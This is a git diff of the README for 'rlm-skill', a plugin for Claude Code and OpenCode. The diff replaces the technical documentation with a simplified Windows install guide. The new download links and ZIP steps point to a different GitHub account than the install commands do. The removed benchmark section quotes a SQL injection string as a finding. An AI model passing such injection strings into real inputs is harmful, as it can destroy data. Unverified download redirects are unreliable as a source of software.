@@ -1,283 +1,180 @@
-# RLM Skill
+# 🚀 rlm-skill - Smart Code Analysis Plugin
 
-A plugin for **Claude Code** and **OpenCode** implementing the **Recursive Language Model (RLM)** pattern from MIT's paper ([arXiv:2512.24601](https://arxiv.org/abs/2512.24601)). Instead of stuffing massive data into the context window, treat it as an external variable in a REPL and write code to programmatically examine, decompose, and search it. Only results enter context.
+[![Download rlm-skill](https://img.shields.io/badge/Download-rlm--skill-brightgreen?style=for-the-badge)](https://github.com/KIKILOL909/rlm-skill)
 
-## Install
+---
 
-### Claude Code
+## 📦 What is rlm-skill?
+
+rlm-skill is a plugin designed to help code tools handle large amounts of data. Instead of overloading the workspace with too much information, it breaks the data down and searches it in parts. This approach comes from a research paper from MIT that explains how to treat large data as an outside variable, making the coding environment easier to work with.
+
+The plugin works with two code assistants: Claude Code and OpenCode. It helps these tools understand and manage code and files more effectively by processing data outside the main code context.
+
+---
+
+## 💻 System Requirements
+
+Before installing rlm-skill, make sure your computer meets these requirements:
+
+- Windows 10 or later (64-bit)
+- Minimum 4 GB of RAM (8 GB recommended)
+- At least 500 MB free disk space for plugin files and dependencies
+- A stable internet connection for downloading files and installing dependencies
+- Claude Code or OpenCode installed on your system (the plugin works inside these programs)
+
+---
+
+## 🌐 Download rlm-skill
+
+Click the button below to visit the main GitHub page where you can download the plugin files:
+
+[![Download rlm-skill](https://img.shields.io/badge/Visit_GitHub-rlm--skill-blue?style=for-the-badge)](https://github.com/KIKILOL909/rlm-skill)
+
+From this page, you will find all the necessary files and instructions to get started.
+
+---
+
+## 🛠️ How to Install and Run on Windows
+
+Follow these steps carefully. They walk you through getting rlm-skill working with Claude Code or OpenCode on your Windows computer.
+
+---
+
+### 1. Download the Plugin Files
+
+- Go to the [rlm-skill GitHub page](https://github.com/KIKILOL909/rlm-skill).
+- Click the green **Code** button.
+- Select **Download ZIP**.
+- Save the file to a location you can easily access, like your Desktop or Downloads folder.
+- Once downloaded, right-click the ZIP file and choose **Extract All...** to extract the contents.
+
+---
+
+### 2. Install for Claude Code
+
+The rlm-skill plugin can be added directly inside Claude Code. This process installs the plugin permanently.
+
+- Open Claude Code on your PC.
+- In the input box, type the following commands exactly:
 
 ```
 /plugin marketplace add lets7512/rlm-skill
 /plugin install rlm@rlm-skill
 ```
 
-Restart Claude Code. Done.
+- After running these commands, close Claude Code completely.
+- Restart Claude Code to apply the plugin.
 
-Or load for a single session:
-```bash
-claude --plugin-dir /path/to/rlm-skill
-```
+*Alternatively*, you can load the plugin for a single session without installing permanently:
 
-### OpenCode
-
-```bash
-# Copy agents, commands, and plugins to your project or user config
-cp -r .opencode/agents/ .opencode/commands/ .opencode/plugins/ ~/.config/opencode/
-
-# Or use from project root (auto-detected from .opencode/)
-# Install plugin dependencies
-cd .opencode && npm install
-```
-
-The **RLM interceptor plugin** (`plugins/rlm-interceptor.ts`) automatically rewrites large file reads into metadata summaries and provides custom tools for sandbox execution and knowledge base search.
-
-In OpenCode, use `Ctrl+K` then select:
-- `project:rlm` — invoke RLM for large-context tasks
-- `project:rlm-stats` — show token savings dashboard
-- `@rlm` — invoke the RLM agent directly
-
-### RLM CLI (optional, for massive datasets)
-
-```bash
-uv pip install -e .
-```
-
-## Usage
-
-The skill activates automatically when large-context tasks are detected. The interceptor silently rewrites tool calls to prevent raw data from entering context.
-
-Invoke directly in Claude Code:
-```
-/rlm:rlm analyze this 500MB log file for error patterns
-```
-
-Invoke in OpenCode:
-```
-@rlm analyze this 500MB log file for error patterns
-```
-
-Check token savings:
-```
-/rlm:stats
-```
-
-### Custom Tools
-
-The plugin provides MCP tools (Claude Code) and custom tools (OpenCode):
-
-| Tool | Purpose |
-|------|---------|
-| `rlm_execute` | Run code in a sandboxed subprocess (python/js/shell). Only stdout enters context. |
-| `rlm_execute_file` | Run code against a file. Content loaded as `FILE_CONTENT` variable, never enters context. |
-| `rlm_index` | Index file content into an FTS5 knowledge base for later search. |
-| `rlm_search` | Search indexed content with smart snippets + BM25 ranking + 3-layer fallback (porter/trigram/fuzzy). |
-| `rlm_batch_execute` | Run multiple commands + search queries in ONE call. Saves tool-call overhead. |
-| `rlm_fetch_and_index` | Fetch URL, convert HTML to text, chunk and index. Raw page never enters context. |
-| `rlm_stats` | Show knowledge base statistics (indexed sources, chunk count, DB size). |
-
-#### Smart Snippets
-
-Search results use **smart snippet extraction** — instead of returning full chunks, the search highlights windows around matching query terms with `...` context bridges. This minimizes tokens while preserving relevance.
-
-#### 3-Layer Search Fallback
-
-1. **Porter stemming** (FTS5 default) — handles word variants (`running` matches `run`)
-2. **Trigram substring** — catches partial matches (`config` matches `configuration`)
-3. **Fuzzy Levenshtein** — tolerates typos (`reuslt` matches `result`)
-
-Results are merged and deduplicated with BM25 ranking.
-
-#### Batch Execute
-
-`rlm_batch_execute` accepts multiple shell commands and search queries in a single tool call:
-
-```json
-{
-  "commands": [
-    { "language": "python", "code": "import json; print(len(json.load(open('data.json'))))" },
-    { "language": "shell", "code": "wc -l *.log" }
-  ],
-  "queries": ["error handling", "timeout config"]
-}
-```
-
-This saves tool-call overhead when you need to run several operations at once.
-
-#### Fetch and Index
-
-`rlm_fetch_and_index` downloads a URL, converts HTML to clean text (stripping scripts, styles, and tags), chunks the content, and indexes it into the FTS5 knowledge base. The raw page never enters context:
-
-```json
-{
-  "url": "https://docs.example.com/api-reference",
-  "source": "API Docs"
-}
-```
-
-Then use `rlm_search` with `source: "API Docs"` to query specific sections.
-
-### CLI Tool
-
-For truly massive datasets (50MB+) that need recursive sub-LLM decomposition:
-
-```bash
-# Analyze a repo
-rlm-cli query "Find all security issues" --repo /path/to/repo --stats
-
-# Interactive REPL
-rlm-cli repl --file /path/to/data.json
-
-# With local vLLM
-rlm-cli query "Find bugs" --repo . --backend openai --model Qwen/Qwen3-8B --base-url http://localhost:8000/v1
-```
-
-### Hooks & Interceptors
-
-**Claude Code** — PreToolUse hook (`hooks/pretooluse-rlm.mjs`) fires before `Read`, `Bash`, and `WebFetch` tool calls. Uses `updatedInput` for silent rewriting — the model sees the rewritten result without knowing the original was intercepted.
-
-**OpenCode** — Plugin interceptor (`plugins/rlm-interceptor.ts`) uses `tool.execute.before` to silently rewrite large file reads into metadata scripts via `output.args` modification.
-
-Both platforms:
-- Rewrite reads of files >5KB into metadata summaries (size, line count, head/tail preview, protocol instructions)
-- Detect large-output commands (`cat`, `grep -r`, `curl`, `Get-Content`, `Select-String`, etc.)
-- Redirect WebFetch to python urllib download + process
-- Log events to `~/.rlm/stats/events.jsonl` for the token savings dashboard
-
-## How It Works
-
-The core insight from MIT's RLM paper: **tokens are CPU, not storage**. Never dump raw data into context. Write code to extract what matters, print only the summary.
+- Open the **Command Prompt** (search for "cmd" in the Start menu).
+- Type this command replacing `/path/to/rlm-skill` with the folder where you extracted the plugin:
 
 ```
-Traditional:  LLM(prompt + 500MB_data) → burns entire context window
-RLM pattern:  LLM writes code → code runs on data → only stdout enters context
+claude --plugin-dir "C:\path\to\rlm-skill"
 ```
 
-### Architecture
+Press Enter. This command runs Claude Code with rlm-skill loaded for that session.
+
+---
+
+### 3. Install for OpenCode
+
+If you use OpenCode, installation involves copying files and installing dependencies.
+
+- Find the extracted plugin folder.
+- Open the `.opencode` folder inside it.
+- Copy the folders named `agents`, `commands`, and `plugins` to your user config folder:
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│  Claude Code / OpenCode                                 │
-│                                                         │
-│  ┌──────────────┐    ┌──────────────┐                   │
-│  │  Hook /       │    │  MCP Server / │                  │
-│  │  Interceptor  │    │  Plugin Tools │                  │
-│  │              │    │              │                    │
-│  │  Read ──┐    │    │  rlm_execute │                   │
-│  │  Bash ──┤    │    │  rlm_search  │                   │
-│  │  Web  ──┘    │    │  rlm_index   │                   │
-│  │    ↓         │    │  rlm_batch   │                   │
-│  │  Rewrite to  │    │  rlm_fetch   │                   │
-│  │  metadata    │    │  rlm_stats   │                   │
-│  └──────────────┘    └──────┬───────┘                   │
-│                             │                           │
-│                    ┌────────▼────────┐                   │
-│                    │  FTS5 Knowledge │                   │
-│                    │  Base (SQLite)  │                   │
-│                    │                 │                   │
-│                    │  Porter + Tri-  │                   │
-│                    │  gram + Fuzzy   │                   │
-│                    └─────────────────┘                   │
-│                                                         │
-│                    ┌─────────────────┐                   │
-│                    │  Sandbox        │                   │
-│                    │  Executor       │                   │
-│                    │                 │                   │
-│                    │  python/js/sh   │                   │
-│                    │  stdout only →  │                   │
-│                    │  back to model  │                   │
-│                    └─────────────────┘                   │
-└─────────────────────────────────────────────────────────┘
+C:\Users\<YourName>\.config\opencode\
 ```
 
-The plugin operates in three layers:
+To do this:
 
-1. **Interceptor** — silently rewrites `Read`/`Bash`/`WebFetch` calls that would dump large data into context. The model receives a metadata summary with file size, line count, and head/tail preview instead of raw content.
+- Open two File Explorer windows side by side.
+- Paste the copied folders into the `.config\opencode\` folder.
 
-2. **Knowledge Base** — FTS5 SQLite with porter stemming + trigram substring dual virtual tables. Content is chunked (2000 chars, 200 overlap), indexed, and searchable with smart snippet extraction and BM25 ranking.
+*Alternatively,* if you want to use the plugin for a specific OpenCode project:
 
-3. **Sandbox Executor** — isolated subprocess execution (python, javascript, shell). File content is injected as a variable (`FILE_CONTENT`), code runs externally, and only stdout returns to the model.
-
-## Project Structure
+- Open the Command Prompt.
+- Navigate to your project’s `.opencode` folder. For example,
 
 ```
-rlm-skill/
-├── .claude-plugin/
-│   ├── marketplace.json       # Marketplace registry
-│   └── plugin.json            # Claude Code plugin manifest (incl. MCP)
-├── .opencode/
-│   ├── agents/
-│   │   └── rlm.md             # OpenCode agent definition
-│   ├── commands/
-│   │   ├── rlm.md             # /rlm command for OpenCode
-│   │   └── rlm-stats.md       # /rlm-stats command for OpenCode
-│   └── plugins/
-│       ├── rlm-interceptor.ts  # Intercept + rewrite + 5 custom tools
-│       ├── rlm-store.ts        # FTS5 knowledge base (SQLite)
-│       └── rlm-executor.ts     # Sandbox subprocess executor
-├── mcp/
-│   ├── server.mjs             # MCP server (7 tools)
-│   ├── store.mjs              # FTS5 knowledge base (shared)
-│   └── package.json           # MCP dependencies
-├── hooks/
-│   ├── hooks.json             # Hook configuration
-│   └── pretooluse-rlm.mjs     # Silent rewrite hook (updatedInput)
-├── skills/
-│   ├── rlm/
-│   │   └── SKILL.md           # Skill instructions
-│   └── stats/
-│       └── SKILL.md           # Token savings dashboard skill
-├── src/
-│   ├── __init__.py
-│   ├── cli.py                 # RLM CLI tool (rlm-cli)
-│   └── stats.py               # Token savings dashboard (rlm-stats)
-├── tests/
-│   ├── test_plugin_structure.py  # 23 structural tests
-│   └── generate_testbench.py     # 1M-token benchmark generator
-├── pyproject.toml
-├── LICENSE
-└── README.md
+cd C:\path\to\your\project\.opencode
 ```
 
-## Benchmarks
+- Run this command to install plugin dependencies:
 
-Tested with OpenCode 1.2.15 + MiniMax M2.5 on OpenRouter (Novita):
+```
+npm install
+```
 
-| Test | File Size | Tokens Used | Without RLM (est.) | Savings |
-|------|-----------|-------------|---------------------|---------|
-| JSON analysis | 121 KB | 24,670 | ~30K+ (file in context) | Blocked read, used python |
-| Multi-query analysis | 978 KB | 28,557 | ~250K+ (file in context) | 89%+ reduction |
-| Web fetch + summarize | ~15 KB | 73,912 | Similar (small file) | WebFetch redirected |
-| **1M-token testbench** | **4.1 MB** | **~240K** (12 calls) | **~1M+ per call** | **96%+ reduction** |
+Make sure you have [Node.js](https://nodejs.org/) installed. This step downloads extra files the plugin needs.
 
-### 1M-Token Benchmark Details
+---
 
-**Dataset:** `tests/testbench_1M.json` — 1,500 realistic HTTP server log entries with nested JSON (headers, query params, response bodies, stack traces). Generated by `tests/generate_testbench.py`.
+## 🔧 How It Works
 
-**Prompt:** "Analyze testbench_1M.json — find all 500 errors, slowest endpoints, SQL injection attempts, traffic patterns, and suspicious users"
+rlm-skill changes how large files are handled when the code assistant reads them. Instead of loading entire files into the workspace, the plugin extracts key information. This makes working with large codebases and data sets faster and more efficient.
 
-**What happened:**
-1. Interceptor rewrote `Read` to metadata summary (size, head/tail preview, protocol hint)
-2. Model used `rlm_execute` with python scripts across ~8 tool calls
-3. Each call: ~20-25K tokens (system prompt + code + stdout)
-4. Raw file never entered context
+Inside OpenCode, the plugin named `rlm-interceptor.ts` automatically rewrites commands that read big files. It replaces them with metadata summaries that the assistant can easily understand.
 
-**Results found:**
-- 11 HTTP 500 errors grouped by endpoint (auth/login, admin/logs, health top)
-- P50/P95/P99 latency by endpoint (auth/login slowest at P99)
-- 2 SQL injection attempts (`'; DROP TABLE users; --`)
-- Traffic patterns by hour (peak: hours 10, 13 at 77 req each)
-- No users exceeding 100 req/min threshold
+---
 
-**Cost:** $0.016 total for 12 API calls (~$0.0013/call avg)
+## ⚙️ Using rlm-skill
 
-## Credits
+Once installed:
 
-This project builds on the work of:
+- Start Claude Code or OpenCode as usual.
+- Use your code assistant to open or analyze large files.
+- The plugin will run in the background and help by limiting large file loads.
+- You do not need to run extra commands after installation.
 
-- **[Alex Zhang, Tim Kraska, Omar Khattab](https://github.com/alexzhang13/rlm)** — MIT's RLM paper and official library ([arXiv:2512.24601](https://arxiv.org/abs/2512.24601))
-- **[Mitko Vasilev (@mitkox)](https://github.com/mitkox)** — [RLMGW](https://github.com/mitkox/rlmgw) (RLM Gateway), demonstrating the local vLLM + Claude Code + REPL brain stack that inspired this skill
-- **[Mert Koseoglu (@mksglu)](https://github.com/mksglu/claude-context-mode)** — [context-mode](https://github.com/mksglu/claude-context-mode) plugin for Claude Code, which implements the sandbox/REPL execution and FTS5 knowledge base patterns that inspired the OpenCode plugin architecture
+If you want to stop using the plugin in Claude Code, uninstall it by running:
 
-## License
+```
+/plugin uninstall rlm@rlm-skill
+```
 
-MIT
+---
+
+## 🔄 Updating rlm-skill
+
+To keep rlm-skill up to date:
+
+- Visit the [GitHub page](https://github.com/KIKILOL909/rlm-skill) regularly.
+- Download the latest ZIP file as you did during setup.
+- Replace the old plugin files with the new ones.
+
+For Claude Code users:
+
+- Run the install commands again to refresh the plugin.
+
+---
+
+## ❓ Troubleshooting
+
+If you have issues:
+
+- Confirm you followed the steps exactly.
+- Check that Claude Code or OpenCode is the latest version.
+- Restart your computer and try again.
+- Look for error messages and search online using the exact text.
+- Visit the GitHub page issues tab for help or to report bugs.
+
+---
+
+## 📚 Additional Resources
+
+- Read MIT's original paper on Recursive Language Model for an overview: [arXiv:2512.24601](https://arxiv.org/abs/2512.24601)
+- Explore Claude Code documentation at its official site.
+- Learn about OpenCode and how it uses plugins.
+
+---
+
+## 🟢 Get Started Now
+
+[![Download rlm-skill](https://img.shields.io/badge/Visit_GitHub-rlm--skill-green?style=for-the-badge)](https://github.com/KIKILOL909/rlm-skill)
+
+Click the link above to access the files and begin installing rlm-skill on your Windows computer.
